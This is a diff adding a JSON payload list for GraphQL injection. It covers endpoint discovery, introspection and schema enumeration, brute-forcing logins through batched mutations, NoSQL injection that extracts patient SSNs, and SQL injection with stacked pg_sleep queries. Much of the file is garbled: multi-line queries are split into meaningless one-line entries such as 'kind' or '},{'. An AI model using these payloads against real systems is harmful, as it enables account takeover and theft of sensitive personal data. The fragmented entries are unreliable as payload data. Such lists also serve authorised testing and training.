@@ -1,0 +1,884 @@
+[
+  {
+    "id": "graphql-injection-1",
+    "title": "Common GraphQL Endpoints",
+    "payload": "/v1/explorer",
+    "context": "Common GraphQL Endpoints",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-2",
+    "title": "Common GraphQL Endpoints",
+    "payload": "/v1/graphiql",
+    "context": "Common GraphQL Endpoints",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-3",
+    "title": "Common GraphQL Endpoints",
+    "payload": "/graph",
+    "context": "Common GraphQL Endpoints",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-4",
+    "title": "Common GraphQL Endpoints",
+    "payload": "/graphql",
+    "context": "Common GraphQL Endpoints",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-5",
+    "title": "Common GraphQL Endpoints",
+    "payload": "/graphql/console/",
+    "context": "Common GraphQL Endpoints",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-6",
+    "title": "Common GraphQL Endpoints",
+    "payload": "/graphql.php",
+    "context": "Common GraphQL Endpoints",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-7",
+    "title": "Common GraphQL Endpoints",
+    "payload": "/graphiql",
+    "context": "Common GraphQL Endpoints",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-8",
+    "title": "Common GraphQL Endpoints",
+    "payload": "/graphiql.php",
+    "context": "Common GraphQL Endpoints",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-9",
+    "title": "Identify An Injection Point",
+    "payload": "GET /graphql?query={yourQueryHere}",
+    "context": "Identify An Injection Point",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-10",
+    "title": "Identify An Injection Point",
+    "payload": "GET /graphql?query={__schema{types{name}}}",
+    "context": "Identify An Injection Point",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-11",
+    "title": "Identify An Injection Point",
+    "payload": "GET /graphiql?query={__schema{types{name}}}",
+    "context": "Identify An Injection Point",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-12",
+    "title": "Identify An Injection Point",
+    "payload": "GET /graphql?query=query%20%7B%20user(id:%221%22)%20%7B%20id%20name%20%7D%20%7D",
+    "context": "Identify An Injection Point",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-13",
+    "title": "Identify An Injection Point",
+    "payload": "POST /graphql/v1 HTTP/1.1",
+    "context": "Identify An Injection Point",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-14",
+    "title": "Identify An Injection Point",
+    "payload": "Host: example.com",
+    "context": "Identify An Injection Point",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-15",
+    "title": "Identify An Injection Point",
+    "payload": "Content-Type: application/json",
+    "context": "Identify An Injection Point",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-16",
+    "title": "Identify An Injection Point",
+    "payload": "\"query\": \"query { user { id name } }\"",
+    "context": "Identify An Injection Point",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-17",
+    "title": "Identify An Injection Point",
+    "payload": "?query={__schema}",
+    "context": "Identify An Injection Point",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-18",
+    "title": "Identify An Injection Point",
+    "payload": "?query={}",
+    "context": "Identify An Injection Point",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-19",
+    "title": "Identify An Injection Point",
+    "payload": "?query={thisdefinitelydoesnotexist}",
+    "context": "Identify An Injection Point",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-20",
+    "title": "Enumerate Database Schema via Introspection",
+    "payload": "\"query\": \"{ __schema { types { name } } }\"",
+    "context": "Enumerate Database Schema via Introspection",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-21",
+    "title": "Enumerate Database Schema via Introspection",
+    "payload": "fragment FullType on __Type {",
+    "context": "Enumerate Database Schema via Introspection",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-22",
+    "title": "Enumerate Database Schema via Introspection",
+    "payload": "kind",
+    "context": "Enumerate Database Schema via Introspection",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-23",
+    "title": "Enumerate Database Schema via Introspection",
+    "payload": "name",
+    "context": "Enumerate Database Schema via Introspection",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-24",
+    "title": "Enumerate Database Schema via Introspection",
+    "payload": "description",
+    "context": "Enumerate Database Schema via Introspection",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-25",
+    "title": "Enumerate Database Schema via Introspection",
+    "payload": "fields(includeDeprecated: true) {",
+    "context": "Enumerate Database Schema via Introspection",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-26",
+    "title": "Enumerate Database Schema via Introspection",
+    "payload": "args {",
+    "context": "Enumerate Database Schema via Introspection",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-27",
+    "title": "Enumerate Database Schema via Introspection",
+    "payload": "...InputValue",
+    "context": "Enumerate Database Schema via Introspection",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-28",
+    "title": "Enumerate Database Schema via Introspection",
+    "payload": "type {",
+    "context": "Enumerate Database Schema via Introspection",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-29",
+    "title": "Enumerate Database Schema via Introspection",
+    "payload": "...TypeRef",
+    "context": "Enumerate Database Schema via Introspection",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-30",
+    "title": "Enumerate Database Schema via Introspection",
+    "payload": "isDeprecated",
+    "context": "Enumerate Database Schema via Introspection",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-31",
+    "title": "Enumerate Database Schema via Introspection",
+    "payload": "deprecationReason",
+    "context": "Enumerate Database Schema via Introspection",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-32",
+    "title": "Enumerate Database Schema via Introspection",
+    "payload": "inputFields {",
+    "context": "Enumerate Database Schema via Introspection",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-33",
+    "title": "Enumerate Database Schema via Introspection",
+    "payload": "interfaces {",
+    "context": "Enumerate Database Schema via Introspection",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-34",
+    "title": "Enumerate Database Schema via Introspection",
+    "payload": "enumValues(includeDeprecated: true) {",
+    "context": "Enumerate Database Schema via Introspection",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-35",
+    "title": "Enumerate Database Schema via Introspection",
+    "payload": "possibleTypes {",
+    "context": "Enumerate Database Schema via Introspection",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-36",
+    "title": "Enumerate Database Schema via Introspection",
+    "payload": "fragment InputValue on __InputValue {",
+    "context": "Enumerate Database Schema via Introspection",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-37",
+    "title": "Enumerate Database Schema via Introspection",
+    "payload": "defaultValue",
+    "context": "Enumerate Database Schema via Introspection",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-38",
+    "title": "Enumerate Database Schema via Introspection",
+    "payload": "fragment TypeRef on __Type {",
+    "context": "Enumerate Database Schema via Introspection",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-39",
+    "title": "Enumerate Database Schema via Introspection",
+    "payload": "ofType {",
+    "context": "Enumerate Database Schema via Introspection",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-40",
+    "title": "Enumerate Database Schema via Introspection",
+    "payload": "query IntrospectionQuery {",
+    "context": "Enumerate Database Schema via Introspection",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-41",
+    "title": "Enumerate Database Schema via Introspection",
+    "payload": "__schema {",
+    "context": "Enumerate Database Schema via Introspection",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-42",
+    "title": "Enumerate Database Schema via Introspection",
+    "payload": "queryType {",
+    "context": "Enumerate Database Schema via Introspection",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-43",
+    "title": "Enumerate Database Schema via Introspection",
+    "payload": "mutationType {",
+    "context": "Enumerate Database Schema via Introspection",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-44",
+    "title": "Enumerate Database Schema via Introspection",
+    "payload": "types {",
+    "context": "Enumerate Database Schema via Introspection",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-45",
+    "title": "Enumerate Database Schema via Introspection",
+    "payload": "...FullType",
+    "context": "Enumerate Database Schema via Introspection",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-46",
+    "title": "Enumerate Database Schema via Introspection",
+    "payload": "directives {",
+    "context": "Enumerate Database Schema via Introspection",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-47",
+    "title": "Enumerate Database Schema via Introspection",
+    "payload": "locations",
+    "context": "Enumerate Database Schema via Introspection",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-48",
+    "title": "Enumerate Database Schema via Suggestions",
+    "payload": "\"message\": \"Cannot query field \\\"one\\\" on type \\\"Query\\\". Did you mean \\\"node\\\"?\",",
+    "context": "Enumerate Database Schema via Suggestions",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-49",
+    "title": "Enumerate Types Definition",
+    "payload": "{__type (name: \"User\") {name fields{name type{name kind ofType{name kind}}}}}",
+    "context": "Enumerate Types Definition",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-50",
+    "title": "Enumerating Paths to a Target Type",
+    "payload": "graphql-path-enum -i ./test_data/h1_introspection.json -t Skill",
+    "context": "Enumerating Paths to a Target Type",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-51",
+    "title": "Enumerating Paths to a Target Type",
+    "payload": "Found 27 ways to reach the \"Skill\" node from the \"Query\" node:",
+    "context": "Enumerating Paths to a Target Type",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-52",
+    "title": "Enumerating Paths to a Target Type",
+    "payload": "- Query (assignable_teams) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill",
+    "context": "Enumerating Paths to a Target Type",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-53",
+    "title": "Enumerating Paths to a Target Type",
+    "payload": "- Query (checklist_check) -> ChecklistCheck (checklist) -> Checklist (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill",
+    "context": "Enumerating Paths to a Target Type",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-54",
+    "title": "Enumerating Paths to a Target Type",
+    "payload": "- Query (checklist_check_response) -> ChecklistCheckResponse (checklist_check) -> ChecklistCheck (checklist) -> Checklist (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill",
+    "context": "Enumerating Paths to a Target Type",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-55",
+    "title": "Enumerating Paths to a Target Type",
+    "payload": "- Query (checklist_checks) -> ChecklistCheck (checklist) -> Checklist (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill",
+    "context": "Enumerating Paths to a Target Type",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-56",
+    "title": "Enumerating Paths to a Target Type",
+    "payload": "- Query (clusters) -> Cluster (weaknesses) -> Weakness (critical_reports) -> TeamMemberGroupConnection (edges) -> TeamMemberGroupEdge (node) -> TeamMemberGroup (team_members) -> TeamMember (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill",
+    "context": "Enumerating Paths to a Target Type",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-57",
+    "title": "Enumerating Paths to a Target Type",
+    "payload": "- Query (embedded_submission_form) -> EmbeddedSubmissionForm (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill",
+    "context": "Enumerating Paths to a Target Type",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-58",
+    "title": "Enumerating Paths to a Target Type",
+    "payload": "- Query (external_program) -> ExternalProgram (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill",
+    "context": "Enumerating Paths to a Target Type",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-59",
+    "title": "Enumerating Paths to a Target Type",
+    "payload": "- Query (external_programs) -> ExternalProgram (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill",
+    "context": "Enumerating Paths to a Target Type",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-60",
+    "title": "Enumerating Paths to a Target Type",
+    "payload": "- Query (job_listing) -> JobListing (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill",
+    "context": "Enumerating Paths to a Target Type",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-61",
+    "title": "Enumerating Paths to a Target Type",
+    "payload": "- Query (job_listings) -> JobListing (team) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill",
+    "context": "Enumerating Paths to a Target Type",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-62",
+    "title": "Enumerating Paths to a Target Type",
+    "payload": "- Query (me) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill",
+    "context": "Enumerating Paths to a Target Type",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-63",
+    "title": "Enumerating Paths to a Target Type",
+    "payload": "- Query (pentest) -> Pentest (lead_pentester) -> Pentester (user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill",
+    "context": "Enumerating Paths to a Target Type",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-64",
+    "title": "Enumerating Paths to a Target Type",
+    "payload": "- Query (pentests) -> Pentest (lead_pentester) -> Pentester (user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill",
+    "context": "Enumerating Paths to a Target Type",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-65",
+    "title": "Enumerating Paths to a Target Type",
+    "payload": "- Query (query) -> Query (assignable_teams) -> Team (audit_log_items) -> AuditLogItem (source_user) -> User (pentester_profile) -> PentesterProfile (skills) -> Skill",
+    "context": "Enumerating Paths to a Target Type",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-66",
+    "title": "Enumerating Paths to a Target Type",
+    "payload": "- Query (query) -> Query (skills) -> Skill",
+    "context": "Enumerating Paths to a Target Type",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-67",
+    "title": "Basic Query",
+    "payload": "user {",
+    "context": "Basic Query",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-68",
+    "title": "Basic Query",
+    "payload": "id",
+    "context": "Basic Query",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-69",
+    "title": "Basic Query",
+    "payload": "query {",
+    "context": "Basic Query",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-70",
+    "title": "Query with Arguments",
+    "payload": "user(id: \"1\") {",
+    "context": "Query with Arguments",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-71",
+    "title": "Query with Arguments",
+    "payload": "email",
+    "context": "Query with Arguments",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-72",
+    "title": "Nested Queries",
+    "payload": "posts {",
+    "context": "Nested Queries",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-73",
+    "title": "Nested Queries",
+    "payload": "title",
+    "context": "Nested Queries",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-74",
+    "title": "Nested Queries",
+    "payload": "comments {",
+    "context": "Nested Queries",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-75",
+    "title": "Nested Queries",
+    "payload": "content",
+    "context": "Nested Queries",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-76",
+    "title": "Mutations",
+    "payload": "mutation{",
+    "context": "Mutations",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-77",
+    "title": "Mutations",
+    "payload": "signIn(login:\"Admin\", password:\"secretp@ssw0rd\"){",
+    "context": "Mutations",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-78",
+    "title": "Mutations",
+    "payload": "token",
+    "context": "Mutations",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-79",
+    "title": "Mutations",
+    "payload": "addUser(id:\"1\", name:\"Dan Abramov\", email:\"dan@dan.com\") {",
+    "context": "Mutations",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-80",
+    "title": "JSON List Based Batching",
+    "payload": "\"query\":\"...\"",
+    "context": "JSON List Based Batching",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-81",
+    "title": "JSON List Based Batching",
+    "payload": "},{",
+    "context": "JSON List Based Batching",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-82",
+    "title": "JSON List Based Batching",
+    "payload": ",{",
+    "context": "JSON List Based Batching",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-83",
+    "title": "JSON List Based Batching",
+    "payload": "...",
+    "context": "JSON List Based Batching",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-84",
+    "title": "Query Name Based Batching",
+    "payload": "\"query\": \"query { qname: Query { field1 } qname1: Query { field1 } }\"",
+    "context": "Query Name Based Batching",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-85",
+    "title": "Query Name Based Batching",
+    "payload": "mutation {",
+    "context": "Query Name Based Batching",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-86",
+    "title": "Query Name Based Batching",
+    "payload": "login(pass: 1111, username: \"bob\")",
+    "context": "Query Name Based Batching",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-87",
+    "title": "Query Name Based Batching",
+    "payload": "second: login(pass: 2222, username: \"bob\")",
+    "context": "Query Name Based Batching",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-88",
+    "title": "Query Name Based Batching",
+    "payload": "third: login(pass: 3333, username: \"bob\")",
+    "context": "Query Name Based Batching",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-89",
+    "title": "Query Name Based Batching",
+    "payload": "fourth: login(pass: 4444, username: \"bob\")",
+    "context": "Query Name Based Batching",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-90",
+    "title": "NOSQL Injection",
+    "payload": "doctors(",
+    "context": "NOSQL Injection",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-91",
+    "title": "NOSQL Injection",
+    "payload": "options: \"{\\\"limit\\\": 1, \\\"patients.ssn\\\" :1}\",",
+    "context": "NOSQL Injection",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-92",
+    "title": "NOSQL Injection",
+    "payload": "search: \"{ \\\"patients.ssn\\\": { \\\"$regex\\\": \\\".*\\\"}, \\\"lastName\\\":\\\"Admin\\\" }\")",
+    "context": "NOSQL Injection",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-93",
+    "title": "NOSQL Injection",
+    "payload": "firstName lastName id patients{ssn}",
+    "context": "NOSQL Injection",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-94",
+    "title": "SQL Injection",
+    "payload": "bacon(id: \"1'\") {",
+    "context": "SQL Injection",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-95",
+    "title": "SQL Injection",
+    "payload": "id,",
+    "context": "SQL Injection",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-96",
+    "title": "SQL Injection",
+    "payload": "type,",
+    "context": "SQL Injection",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-97",
+    "title": "SQL Injection",
+    "payload": "price",
+    "context": "SQL Injection",
+    "tags": [
+      "graphql-injection"
+    ]
+  },
+  {
+    "id": "graphql-injection-98",
+    "title": "SQL Injection",
+    "payload": "user(name: \"patt';SELECT 1;SELECT pg_sleep(30);--'\") {",
+    "context": "SQL Injection",
+    "tags": [
+      "graphql-injection"
+    ]
+  }
+]
